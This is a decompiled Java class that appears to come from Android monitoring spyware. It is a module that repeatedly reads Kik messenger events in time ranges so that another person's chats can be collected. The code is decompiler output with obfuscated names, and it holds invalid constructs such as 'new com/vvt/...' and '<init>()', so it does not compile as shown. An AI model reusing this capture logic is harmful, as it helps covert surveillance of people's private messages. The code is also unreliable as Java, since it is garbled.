package com.vvt.capture.kik.a;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class e
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  private long d = -1;
  private String e;
  private com.vvt.base.b f;
  
  public e(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      long l3 = com.vvt.capture.kik.b.a();
      bool1 = false;
      Object localObject = null;
      l2 = l3;
      int j = 0;
      for (;;)
      {
        boolean bool3 = l2 < l1;
        if (bool3) {
          break;
        }
        int k = 5;
        if (j >= k) {
          break;
        }
        l2 = 2000L;
        SystemClock.sleep(l2);
        long l4 = com.vvt.capture.kik.b.a();
        int i = j + 1;
        j = i;
        l2 = l4;
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l2 = l1;
      bool4 = l2 < l1;
      if (bool4) {
        break label162;
      }
    }
    if (bool2) {}
    l2 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l2);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label162:
      this.d = l2;
    }
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str1 = com.vvt.n.a.c.a.b();
    String str2 = com.vvt.n.a.c.a.a();
    long l1;
    long l2;
    if ((str1 != null) && (str2 != null))
    {
      l1 = com.vvt.capture.kik.b.a(paramInt, str1) - 1L;
      l2 = com.vvt.capture.kik.b.b(str1);
    }
    try
    {
      Object localObject = this.e;
      com.vvt.base.b localb = this.f;
      localObject = com.vvt.capture.kik.b.a((String)localObject, str1, str2, l1, l2, localb);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str1 = com.vvt.n.a.c.a.b();
    String str2 = com.vvt.n.a.c.a.a();
    if ((str1 != null) && (str2 != null)) {}
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      com.vvt.base.b localb = this.f;
      localObject = com.vvt.capture.kik.b.a((String)localObject, str1, str2, l1, l2, localb);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/kik/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */